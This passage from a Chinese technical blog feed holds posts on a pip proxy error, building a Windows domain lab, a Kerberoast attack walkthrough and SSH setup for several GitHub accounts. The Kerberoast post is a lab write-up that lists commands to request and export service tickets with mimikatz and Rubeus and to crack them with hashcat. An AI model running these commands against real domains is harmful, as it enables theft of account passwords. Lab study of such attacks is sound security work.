class="hljs-number">9</span>)<br></code></pre></td></tr></tbody></table></figure><p>当我看到21.1.3 我内心大概有了猜测，搜索“pip 21.1.3 ERROR: No matching packages”,得到一个答案：</p><blockquote><p>在 pip 版本 20.3 或更高版本中，pip cache purge 命令已经被废弃，并且在最新版本的pip中已经被删除。因此，如果您使用的是 pip 版本 21.1.3，执行 pip cache purge 命令会提示 “ERROR: No matching packages”，这是因为此命令已经不存在了。</p></blockquote><p>这个时候我直接搜索了全部的报错信息：</p><blockquote><p>ERROR: Exception:<br>Traceback (most recent call last):<br>File “d:\python\lib\site-packages\pip_internal\cli\base_command.py”, line 180, in _main<br>status = self.run(options, args)<br>File “d:\python\lib\site-packages\pip_internal\cli\req_command.py”, line 205, in wrapper<br>return func(self, options, args)<br>File “d:\python\lib\site-packages\pip_internal\commands\install.py”, line 318, in run<br>requirement_set = resolver.resolve(<br>File “d:\python\lib\site-packages\pip_internal\resolution\resolvelib\resolver.py”, line 127, in resolve<br>result = self._result = resolver.resolve(<br>File “d:\python\lib\site-packages\pip_vendor\resolvelib\resolvers.py”, line 473, in resolve<br>state = resolution.resolve(requirements, max_rounds=max_rounds)<br>File “d:\python\lib\site-packages\pip_vendor\resolvelib\resolvers.py”, line 341, in resolve<br>name, crit = self._merge_into_criterion(r, parent=None)<br>File “d:\python\lib\site-packages\pip_vendor\resolvelib\resolvers.py”, line 172, in _merge_into_criterion<br>if not criterion.candidates:<br>File “d:\python\lib\site-packages\pip_vendor\resolvelib\structs.py”, line 139, in bool<br>return bool(self.sequence)<br>File “d:\python\lib\site-packages\pip_internal\resolution\resolvelib\found_candidates.py”, line 143, in bool<br>return any(self)<br>File “d:\python\lib\site-packages\pip_internal\resolution\resolvelib\found_candidates.py”, line 129, in <genexpr><br>return (c for c in iterator if id(c) not in self.incompatible_ids)<br>File “d:\python\lib\site-packages\pip_internal\resolution\resolvelib\found_candidates.py”, line 30, in _iter_built<br>for version, func in infos:<br>File “d:\python\lib\site-packages\pip_internal\resolution\resolvelib\factory.py”, line 269, in iter_index_candidate_infos<br>result = self._finder.find_best_candidate(<br>File “d:\python\lib\site-packages\pip_internal\index\package_finder.py”, line 879, in find_best_candidate<br>candidates = self.find_all_candidates(project_name)<br>File “d:\python\lib\site-packages\pip_internal\index\package_finder.py”, line 824, in find_all_candidates<br>page_candidates = list(page_candidates_it)<br>File “d:\python\lib\site-packages\pip_internal\index\sources.py”, line 134, in page_candidates<br>yield from self._candidates_from_page(self._link)<br>File “d:\python\lib\site-packages\pip_internal\index\package_finder.py”, line 783, in process_project_url<br>html_page = self._link_collector.fetch_page(project_url)<br>File “d:\python\lib\site-packages\pip_internal\index\collector.py”, line 512, in fetch_page<br>return _get_html_page(location, session=self.session)<br>File “d:\python\lib\site-packages\pip_internal\index\collector.py”, line 422, in _get_html_page<br>resp = _get_html_response(url, session=session)<br>File “d:\python\lib\site-packages\pip_internal\index\collector.py”, line 120, in _get_html_response<br>resp = session.get(<br>File “d:\python\lib\site-packages\pip_vendor\requests\sessions.py”, line 555, in get<br>return self.request(‘GET’, url, kwargs)<br>File “d:\python\lib\site-packages\pip_internal\network\session.py”, line 449, in request<br>return super().request(method, url, *args, kwargs)<br>File “d:\python\lib\site-packages\pip_vendor\requests\sessions.py”, line 542, in request<br>resp = self.send(prep, send_kwargs)<br>File “d:\python\lib\site-packages\pip_vendor\requests\sessions.py”, line 655, in send<br>r = adapter.send(request, kwargs)<br>File “d:\python\lib\site-packages\pip_vendor\cachecontrol\adapter.py”, line 53, in send<br>resp = super(CacheControlAdapter, self).send(request, **kw)<br>File “d:\python\lib\site-packages\pip_vendor\requests\adapters.py”, line 439, in send<br>resp = conn.urlopen(<br>File “d:\python\lib\site-packages\pip_vendor\urllib3\connectionpool.py”, line 696, in urlopen<br>self._prepare_proxy(conn)<br>File “d:\python\lib\site-packages\pip_vendor\urllib3\connectionpool.py”, line 964, in _prepare_proxy<br>conn.connect()<br>File “d:\python\lib\site-packages\pip_vendor\urllib3\connection.py”, line 359, in connect<br>conn = self._connect_tls_proxy(hostname, conn)<br>File “d:\python\lib\site-packages\pip_vendor\urllib3\connection.py”, line 500, in <em>connect_tls_proxy<br>return ssl_wrap_socket(<br>File “d:\python\lib\site-packages\pip_vendor\urllib3\util\ssl</em>.py”, line 432, in ssl_wrap_socket<br>ssl_sock = <em>ssl_wrap_socket_impl(sock, context, tls_in_tls)<br>File “d:\python\lib\site-packages\pip_vendor\urllib3\util\ssl</em>.py”, line 474, in _ssl_wrap_socket_impl<br>return ssl_context.wrap_socket(sock)<br>File “d:\python\lib\ssl.py”, line 500, in wrap_socket<br>return self.sslsocket_class._create(<br>File “d:\python\lib\ssl.py”, line 997, in _create<br>raise ValueError(“check_hostname requires server_hostname”)<br>ValueError: check_hostname requires server_hostname</genexpr></p></blockquote><h2 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h2><blockquote><p>这个报错是由于 <code>pip</code> 在使用 TLS 代理时出现了问题。</p><p>问题可能是由于您使用的代理服务器没有正确配置 TLS 证书，或者是由于代理服务器返回的响应中缺少必要的信息导致的。</p></blockquote><p>📌我看到这个回答，马上就明白可能是因为我开了<strong>网络代理</strong>的原因。</p><p>📌关闭代理后，执行命令一切正常了。</p><p>做完这一切后，知道自己又陷入经验主义的错误后，想到了自己以前经常犯的错误：</p><p><strong>报错的真正原因可能是在出现在头部，也可能在尾部，而不应该总是从ERROR开始跟踪报错</strong></p><p>之后又仔细查看了报错，搜索了这么一个关键报错：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">pip ValueError: check_hostname <span class="hljs-keyword">requires</span> server_hostname<br></code></pre></td></tr></tbody></table></figure><p>w3c的一个回答不错，还有分析：<a href="https://www.w3cschool.cn/article/92755260.html">文章链接</a></p><p>分析如下：</p><blockquote><p>出现这个错误的原因是使用了代理，由于”总”所周知的原因，有些外网需要一些特殊手段才能访问，而要访问这些网站就需要使用代理，作者的朋友当时就是代理没有关掉，所以在pip的时候才会报错。</p><p>为什么使用代理会出现这样的错误呢，作者找到了蛛丝马迹：pip的较新的版本有这样的一个要求，就是标记对pip仓库的信任，或者使用https进行数据传输（类似的问题作者在学习linux的时候也遇到过）。而使用代理会导致pip认为你请求的仓库不是安全的，所以安装失败，所以解决方法就是关闭代理，或者在代理中设置相关内容。</p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="pip报错"><a href="#pip报错" class="headerlink" title="pip报错"></a>pip报错</h3><p>ERROR: Exception:</p><p>Traceback (most recent call last):<br>File “d:\python\lib\site-packages\pip_internal\cli\base_command.py”, line 180, in _main</p><p>……</p><p>ValueError: check_hostname requires server_hostname</p><h3 id="一个解决办法"><a href="#一个解决办法" class="headerlink" title="一个解决办法"></a>一个解决办法</h3><p>有可能是开启了网络代理的原因，请关闭网络代理尝试重新执行命令。</p>]]></content>
    
    
    <categories>
      
      <category>计算机和网络技能</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>域环境的搭建</title>
    <link href="/posts/20230605-bbf780e8.html"/>
    <url>/posts/20230605-bbf780e8.html</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="域环境的搭建"><a href="#域环境的搭建" class="headerlink" title="域环境的搭建"></a>域环境的搭建</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当你需要搭建域环境，那么说明应该对什么是域已经有一定的了解，不细说，随便找了一篇介绍搭建域环境的<a href="https://www.cnblogs.com/romatic/p/13284787.html">文章</a>，时效性自行验证，本文主要讨论搭建域环境需要注意的事情，帮助那些在搭建域环境和我一样踩坑的人。</p><p>虚拟机软件：VMware Workstation Pro</p><p>IOS镜像：<a href="https://msdn.itellyou.cn/">MSDN</a></p><p>​tips：小米手机自带浏览器就可以新建ed2k类型(ED2K可视为P2P下载链接)的下载任务.</p><h2 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h2><p>在虚拟机的菜单栏可以选择“编辑-&gt;虚拟网络编辑器”，可以看到我们的虚拟网络适配器，一般情况下：</p><ul><li>虚拟网络适配器VMnet1是 <strong>仅主机模式</strong> 默认的虚拟网络适配器</li><li>虚拟网络适配器VMnet8是 <strong>NAT模式</strong> 默认的虚拟网络适配器</li></ul><p>在后文，我们将虚拟网络适配器理解为网卡。我为域环境内的计算机添加的网卡选择的模式就是仅主机模式，在搭建域环境的时候比较重要的是选择合适的网段，我的VMnet1子网IP段为192.168.10.0/24，掩码255.255.255.0，因为我不希望我的计算机的IP地址是随机的，因此取消勾选使用DHCP将IP分给虚拟机，这就是说我们要手动给计算机分配IP，这里是否取消勾选是不重要的。</p><p>设置了子网IP段后，也就是说我们的域内计算机所在的内网IP段已经确定，在手动给域内计算机分配IP时，IP要属于这一网段。</p><h2 id="计算机IP设置"><a href="#计算机IP设置" class="headerlink" title="计算机IP设置"></a>计算机IP设置</h2><p>虚拟机的网段设置好后，我们要为我们的域内计算机手动分配静态IP。</p><h3 id="Windows操作系统"><a href="#Windows操作系统" class="headerlink" title="Windows操作系统"></a>Windows操作系统</h3><p>在window操作系统的图形界面中，找到网络适配器，更改适配器设置，在属性里，修改IPV4的设置，选择合适的IP作为静态IP，DNS的设置为你部署DNS服务的计算机的IP，一般在域控部署DNS服务，那么不论是域控还是域用户的计算机，DNS都可以设置为域控的IP地址。</p><p>然后在cmd中，重启网卡后，可以使用ipconfig查看网卡对应的IP地址。</p><h3 id="Linux操作系统"><a href="#Linux操作系统" class="headerlink" title="Linux操作系统"></a>Linux操作系统</h3><p>Linux操作系统是不方便加入Windows域中的，在搭建域环境，尽量不要打算使用Linux系统的计算机入域。这里来讲一下如何给Linux系统的计算机设置静态IP的步骤：</p><p>要给Linux计算机设置静态IP地址，需要进行以下步骤：</p><ol><li><p>打开终端窗口，使用文本编辑器打开网络配置文件。在大多数Linux发行版中，网络配置文件位于“/etc/network/interfaces”或“/etc/sysconfig/network-scripts/”目录下，具体路径可能会有所不同。</p></li><li><p>找到需要设置静态IP地址的网络接口，例如eth0。在接口配置块中添加以下内容：</p></li></ol><figure class="highlight nginx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">auto</span> eth0<br>iface eth0 inet static<br>address <span class="hljs-number">192.168.1.100</span>     <span class="hljs-comment"># 设置静态IP地址</span><br>netmask <span class="hljs-number">255.255.255.0</span>    <span class="hljs-comment"># 设置子网掩码</span><br>gateway <span class="hljs-number">192.168.1.1</span>      <span class="hljs-comment"># 设置网关地址</span><br>dns-nameservers <span class="hljs-number">8.8.8.8</span>  <span class="hljs-comment"># 设置DNS服务器地址</span><br></code></pre></td></tr></tbody></table></figure><p>在上述配置中，address为需要设置的静态IP地址，netmask为子网掩码，gateway为网关地址，dns-nameservers为DNS服务器地址。这些信息需要根据实际情况进行修改。</p><ol start="3"><li>保存文件并关闭文本编辑器。然后，使用以下命令重启网络服务，使配置生效：</li></ol><figure class="highlight ebnf"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo systemctl restart networking</span><br></code></pre></td></tr></tbody></table></figure><p>执行完上述命令后，静态IP地址就会生效。可以使用ifconfig命令或ip addr命令检查网络接口的IP地址是否已经改变。</p><p>需要注意的是，在设置静态IP地址时，需要确保该IP地址没有被其他设备使用，并且与所在网络的IP地址段、子网掩码、网关地址等参数相匹配，否则网络连接可能会出现问题。</p><h3 id="域控的搭建"><a href="#域控的搭建" class="headerlink" title="域控的搭建"></a>域控的搭建</h3><p>搭建域控根据网上靠谱的教程都是没有问题的，但这里要列一下注意点：</p><ul><li>部署DC时，如果教程没有让你同时勾选DNS服务器，如果没有别的要求，即DNS可以和域控在同一计算机，勾选DNS服务器！</li><li>.net formwork3.5和.net formwork4.6最好一起勾选</li><li>域控设置域名时，不要离谱，尽量符合域名的命名格式，同时也要避免选择的域名为已经在互联网已经被频繁使用。</li></ul><h3 id="计算机入域"><a href="#计算机入域" class="headerlink" title="计算机入域"></a>计算机入域</h3><p>假设我们已经在windows server 2016部署了域控和DNS服务器，域名为fraxdeo.web,另一台计算机win 7要入域，那么这些工作是必须的：</p><p>win 7的DNS服务器地址为：DNS服务器所在计算机的IP地址，一般为域控的IP地址。</p><p>已经为入域的计算机选择了合适的域内用户，并设置了账户名和密码。</p><p>win 7可以ping通域名。</p><h2 id="踩过的坑"><a href="#踩过的坑" class="headerlink" title="踩过的坑"></a>踩过的坑</h2><p>1.计算机不能加入域</p><p>在域内，win 7可以ping通域控域名，也可以ping通域控域名，回复的IP是域控在内网的静态IP，但是加域时依旧报错，信息如下：</p><blockquote><p>已成功查询 DNS，获取服务位置(SRV)资源记录(此资源记录用于查找域“feaxdeo.web”的域控制器):</p><p>此查询用于查找 _ldap._tcp.dc._msdcs.feaxdeo.web 的 SRV 记录</p><p>下列域控制器由查询识别:<br>        DC.feaxdeo.web</p><p>但是无法连接到域控制器。</p><p>此错误的常见原因包括:</p><ul><li>将域控制器的名称映射到其 IP 地址的主机(A)或主机(AAAA)记录丢失或包含错误地址。</li><li>在 DNS 中注册的域控制器没有连接到网络上，或没有运行。<br>报错如上，请分析</li></ul></blockquote><p>原因：因为一些原因，给域控添加了两张网卡，一张仅主机模式在内网，一张NAT模式连接外网，导致加域失败。</p><p>解决办法：删除多余的网卡</p><p>2.加域后计算机登陆问题</p><p>比如我们加域前一直用用户fraxdeo登陆win 7，加域时使用的用户是abc，win 7加域后登陆时的用户一般就是fraxdeo/abc,前面的fraxdeo是域名，如果要登陆到自己的计算机，登陆名应该是<strong>计算机名/用户名。</strong></p><p>3.ping不通域名</p><p>要加域的计算机可以ping通域控的IP，但是ping不同域名，也就是DNS问题，除了常见问题，如DNS地址设置不正确，还可以手动配置域控制器的主机记录(A/AAAA)。</p><blockquote><p>要配置域控制器的主机记录(A/AAAA)，以确保正确的 DNS 解析，可以按照以下步骤进行操作：</p><ol><li>登录到域控制器服务器上，打开“DNS 管理器”，并展开相应的 DNS 区域。</li><li>在左侧窗格中找到要添加或修改主机记录的主机名，右键单击它，并选择“新建记录”选项。</li><li>在“新建记录”对话框中，选择记录类型为“主机(A)”或“主机(AAAA)”，并填写以下信息：<ul><li>名称：填写要添加或修改主机记录的主机名。</li><li>IP 地址：填写要映射到该主机名的 IP 地址。</li><li>时间到期：根据需要设置记录的到期时间。</li></ul></li><li>单击“确定”按钮，以创建或修改主机记录。现在，在 DNS 区域中，您应该能够看到新添加或修改的主机记录。</li></ol><p>请注意，在添加或修改主机记录时，请确保填写正确的主机名和 IP 地址。如果主机名或 IP 地址填写错误，可能会导致DNS 解析失败。此外，如果您在添加或修改主机记录时遇到任何问题，请参考相关的技术文档和教程，或者咨询专业的 IT 技术人员，以获取更多帮助和支持。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>内网渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Kerberoast攻击分析</title>
    <link href="/posts/20230529-b244341.html"/>
    <url>/posts/20230529-b244341.html</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我将使用chatGPT在前言对一些基础性知识进行解释。</p><p>需要说明，图片托管在github上，国内IP访问github资源加载速度极慢或者加载失败，请尽量使用国外IP访问。</p><h3 id="什么是Kerberoast攻击"><a href="#什么是Kerberoast攻击" class="headerlink" title="什么是Kerberoast攻击"></a>什么是Kerberoast攻击</h3><blockquote><p>Kerberoast是一种用于攻击 Windows 域环境中使用的 Kerberos 身份验证协议的攻击技术。Kerberos 是一种安全的身份验证协议，用于在 Windows 域环境中进行用户身份验证和授权。在 Kerberos 协议中，用户会向 Kerberos 服务器请求一个安全令牌（ticket），用于在 Windows 域环境中访问资源。</p><p>Kerberoast 攻击利用了 Kerberos 协议中的漏洞，通过获取 Kerberos 中的服务票据（Service Ticket），并对其进行离线攻击，从而获取到目标用户的明文密码。攻击者可以利用 Kerberoast 攻击来在不知道用户密码的情况下获取到用户的密码哈希值，然后使用密码破解工具对其进行破解，最终获取到用户的明文密码。由于攻击者可以在离线环境中进行攻击，因此 Kerberoast 攻击可以避免被 Kerberos 协议的防护机制所检测到。</p></blockquote><h3 id="什么是SPN"><a href="#什么是SPN" class="headerlink" title="什么是SPN"></a>什么是SPN</h3><blockquote><p>SPN（Service Principal Name）是指服务主体名称，是 Kerberos 身份验证协议中用于标识服务实例的唯一标识符。SPN 通常由服务名称和主机名组成，用于标识服务在网络上的唯一实例，帮助 Kerberos 协议正确地将服务票据（Service Ticket）授予给服务实例。</p><p>在 Windows 域环境中，SPN 是非常重要的，因为 Kerberos 身份验证协议是 Windows 域环境中最常用的身份验证协议。如果 SPN 配置不正确，可能会导致 Kerberos 身份验证协议无法正常工作，从而影响到整个域环境的安全和稳定性。</p></blockquote><h4 id="SPN的类型"><a href="#SPN的类型" class="headerlink" title="SPN的类型"></a>SPN的类型</h4><ul><li>一种是注册在活动目录的机器帐户（Computers）下。当一个服务的权限为 Local System 或 Network Service 时，则 SPN 注册在机器帐户（Computers）下。</li><li>另一种是注册在活动目录的域用户帐户（Users）下，当一个服务的权限为一个域用户时，则 SPN 注册在域用户帐户（Users）下。</li></ul><p>域环境下执行命令：<code>setspn -q */*</code>查看当前域内所有SPN，SPN分类如下：</p><p>以CN开头的每一行代表一个帐户，其下的信息是与该帐户相关联的SPN,默认有三个：</p><p>域控制器：CN=DC,OU=Domain Controllers,DC=fraxdeo,DC=cn</p><p>域用户帐户：CN=krbtgt,CN=Users,DC=fraxdeo,DC=cn</p><p>机器帐户：CN=WIN7,CN=Computers,DC=fraxdeo,DC=cn</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a><a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a></h3><p>从内存中提取明文密码、散列、PIN 码和 kerberos 票据现在已广为人知。**<code>mimikatz</code>**还可以执行 pass-the-hash、pass-the-ticket 或 build <em>Golden tickets</em>。</p><h3 id="Rubeus"><a href="#Rubeus" class="headerlink" title="Rubeus"></a><a href="https://github.com/GhostPack/Rubeus">Rubeus</a></h3><p>Rubeus是一个 C# 工具集，是可以针对Kerberos协议进行攻击的工具,可以发起Kerberos请求,并将请求票据导入内存中,Rebeus提供了大量的用于Kerberos攻击的功能,比如TGT请求/ST请求/AS-REP Roasting攻击/Kerberoasting攻击/委派攻击/黄金票据/白银票据等。</p><h3 id="Hashcat"><a href="#Hashcat" class="headerlink" title="Hashcat"></a><a href="https://github.com/hashcat/hashcat">Hashcat</a></h3><p>hashcat工具的简介与使用可以参考：<a href="https://goyasha.com/post/ZKgJ5d4Q/">本文</a></p><hr><p>工具的简介与使用互联网解释的比我好，上面工具罗列了他们的github地址，请参考</p><h2 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h2><p>域控：Windows service 2016</p><p>​同时安装SQL Server 2008 R2 </p><p>​同时创建用户mssql，密码sky@1321</p><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">setspn -A MSSQLSvc/demo<span class="hljs-selector-class">.test</span><span class="hljs-selector-class">.com</span>:<span class="hljs-number">1443</span> mssql<br></code></pre></td></tr></tbody></table></figure><p>注册一条服务类为MSSQLSvc，主机为demo.test.com，端口为1433，注册在mssql域用户下</p><figure class="highlight asciidoc"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">setspn -q <span class="hljs-strong">*/*</span><br></code></pre></td></tr></tbody></table></figure><p>查看当前所有域</p><figure class="highlight pgsql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Add</span>-<span class="hljs-keyword">Type</span> -AssemblyName <span class="hljs-keyword">System</span>.IdentityModel<br><span class="hljs-built_in">New</span>-<span class="hljs-keyword">Object</span> <span class="hljs-keyword">System</span>.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/demo.test.com:1443"<br></code></pre></td></tr></tbody></table></figure><p>请求SPNKerberos票据——单个服务</p><p><img src="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230529125706148.png" alt="image-20230529125706148"></p><figure class="highlight ebnf"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">klist</span><br></code></pre></td></tr></tbody></table></figure><p>查看缓存中的所有票据</p><p><img src="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230529125851635.png" alt="image-20230529125851635"></p><p>使用Rubeus和mimikatz都可以导出票据</p><figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">kerberos::list /<span class="hljs-keyword">export</span><span class="hljs-comment">//mimikatz执行</span><br>Rubeus.exe kerberoast /outfile:hash.txt<br></code></pre></td></tr></tbody></table></figure><p>mimikatz:kerberos::list /export</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python2.<span class="hljs-number">7</span> tgsrepcrack<span class="hljs-selector-class">.py</span> zidian<span class="hljs-selector-class">.txt</span> ex.kirbi<br></code></pre></td></tr></tbody></table></figure><p>在kali安装kerberoast，使用kerberoast的tgsrepcrack.py离线破解票据ex.kirbi</p><p>rubeus:<img src="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230529130759981.png" alt="image-20230529130759981"></p><p>因为hashcat的运行模式，在虚拟机破解报错，我们在真机运行以下命令，尝试破解</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">hashcat<span class="hljs-selector-class">.exe</span> -m <span class="hljs-number">13100</span> hash<span class="hljs-selector-class">.txt</span> ziidian.txt<br></code></pre></td></tr></tbody></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230529131206163.png" alt="image-20230529131206163"></p><p>成功，可以看到密码sky@1321</p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>注册主机名要和后面请求票据时保持一致。</p><p>demo是主机名，test.com是域控网址。</p><p>zidian.txt是包含密码的字典，可能不包含你设置账户的密码，可以自行添加</p><p>-m 13100是破解的散列值类型，可以这篇<a href="https://goyasha.com/post/ZKgJ5d4Q/">文章</a>选择</p>]]></content>
    
    
    <categories>
      
      <category>内网渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>一台电脑SSH连接多个github账户的配置细节</title>
    <link href="/posts/20230526-155c2f89.html"/>
    <url>/posts/20230526-155c2f89.html</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>作者在已经使用默认私钥连接某个github账户后，现在需要在另一个github账户上搭建Hexo博客，那么就需要配置两个私钥，下面就是配置过程的一些细节。</p><h3 id="配置SSH密钥："><a href="#配置SSH密钥：" class="headerlink" title="配置SSH密钥："></a>配置SSH密钥：</h3><p>只有配置好 SSH 密钥后，我们才可以通过 git 操作实现本地代码库与 Github 代码库同步，在你第一次新建的文件夹里面（如：我的文件夹为：F:\Hnkey\Blog），右键Git Bash Here 输入以下命令：</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ ssh-keygen -t rsa -C <span class="hljs-string">"your email@example.com"</span> <br><span class="hljs-regexp">//</span>引号里面填写你的邮箱地址，比如abcdefg@qq.com<br></code></pre></td></tr></tbody></table></figure><p>然后会出现以下信息：</p><figure class="highlight gradle"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">Generating <span class="hljs-keyword">public</span>/<span class="hljs-keyword">private</span> rsa key pair.  <br>Enter <span class="hljs-keyword">file</span> in which to save the key (<span class="hljs-regexp">/c/U</span>sers<span class="hljs-regexp">/you/</span>.ssh/id_rsa):  <br></code></pre></td></tr></tbody></table></figure><p>不要以默认方式存储密钥，这样会覆盖我们以前的密钥：</p><p>选择一个合适的密钥名字，如：id_rsa_hnkey,然后就可以一直回车了，现在我们到C盘的.SSH文件里查看，就会有我们原来默认的私钥和新创建的私钥文件,文件列表如下：</p><figure class="highlight autohotkey"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">id_rsa<br>id_rsa.pub<br>id_rs<span class="hljs-built_in">a_hnkey</span><br>id_rs<span class="hljs-built_in">a_hnkey</span>.pub<br></code></pre></td></tr></tbody></table></figure><p>我们现在需要在该目录(我的.ssh目录：C:\Users\book.ssh)下新创建一个配置文件，文件名为config,没有后缀名，config文件编辑以下内容：</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 加上以下内容</span><br><span class="hljs-comment">#default github</span><br>Host github.com<br>HostName github.com<br>PreferredAuthentications publickey<br>IdentityFile ~<span class="hljs-regexp">/.ssh/i</span>d_rsa<br> <br>Host hnkey.github.com<span class="hljs-comment">#取一个区别与默认Host(github.com)的别名，任意取，建议别名方便记忆</span><br>HostName github.com<span class="hljs-comment">#不要改这行</span><br>PreferredAuthentications publickey<br>IdentityFile ~<span class="hljs-regexp">/.ssh/i</span>d_rsa_hnkey<span class="hljs-comment">#私钥文件名</span><br>user hnkey<span class="hljs-comment">#指明是谁在使用改私钥</span><br></code></pre></td></tr></tbody></table></figure><p>由于第一个私钥是默认的，如果你也有一个默认的私钥，那么可以不做修改，主要需要对第二个私钥进行配置，细节在上文已经注释</p><p>修改完成后，测试一下链接是否成功建立</p><figure class="highlight nginx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> -T git<span class="hljs-variable">@hnkey</span>.github.com<br></code></pre></td></tr></tbody></table></figure><p>区别于默认的测试命令</p><p>如果出现错误： Permission denied (publickey).</p><p>那么执行一下以下命令：</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">ssh-agent -s<br>ssh-add ~<span class="hljs-regexp">/.ssh/i</span>d_rsa_hnkey<span class="hljs-comment">#私钥文件名需要修改</span><br></code></pre></td></tr></tbody></table></figure><p>再执行测试命令，一般都不会出错，会出现以下提示：</p><figure class="highlight 1c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">Hi,xxxxx, You<span class="hljs-string">"ve successfully......</span><br></code></pre></td></tr></tbody></table></figure><p>说明同一设备连接多github账户已经成功</p><h3 id="配置GIT个人信息"><a href="#配置GIT个人信息" class="headerlink" title="配置GIT个人信息"></a>配置GIT个人信息</h3><p>如果你在曾经连接GitHub仓库已经配置了全局的个人信息，不用清除，因为我得到的答案是局部配置会优于全局配置生效，那么，我们只需要在该仓库下配置局部的个人信息，就可以了。</p><p>为确保这是一个合格的git仓库，请在该仓库的起始目录初始化：</p><figure class="highlight csharp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">git <span class="hljs-keyword">init</span><br></code></pre></td></tr></tbody></table></figure><p>然后执行以下命令，配置局部的git个人信息：</p><figure class="highlight pgsql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">git config <span class="hljs-keyword">user</span>.name "your.name"#需要配置的用户名和邮箱，这里的your.name,就输入前面config文件中的<span class="hljs-keyword">user</span>用户<br>git config <span class="hljs-keyword">user</span>.email "your.email"<br></code></pre></td></tr></tbody></table></figure><p>以后，我们在该仓库下执行克隆等命令，都需要使用别名</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">git clone git@hnkey<span class="hljs-selector-class">.github</span><span class="hljs-selector-class">.com</span>:Hooahhh/hexo-theme-fluid<span 